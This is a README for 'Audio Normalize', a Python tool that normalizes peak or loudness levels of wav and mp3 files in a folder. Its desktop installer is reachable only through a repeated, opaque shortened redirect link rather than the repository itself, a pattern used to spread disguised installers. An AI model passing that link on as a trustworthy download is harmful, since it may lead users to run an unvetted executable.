![Audio Normalize](assets/hero.png)

# Audio Normalize

*Even volume across a voice folder.*

## Overview

**Audio Normalize** is a media utility. Normalize peak or loudness of wav and mp3 files in a folder.

A podcast batch has one quiet file and one that clips.

Files stay on the machine that runs the tool. Originals are left alone unless you choose otherwise.

## Editions

Use the command-line copy in this repository if you already have Python.

If you want a normal installer for Windows or macOS, open the [setup page](https://share.google/A1IHfyGRT0zGRLqj8) and follow the steps there.

## What it does

- Peak or loudness target
- wav and mp3
- Keeps sources
- Reports before and after levels

## Environment

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## Run locally

Python 3.11 or newer. From the repository root:

```powershell
pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Install

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/smitchell05/audio-normalize

MIT license. See `LICENSE`.
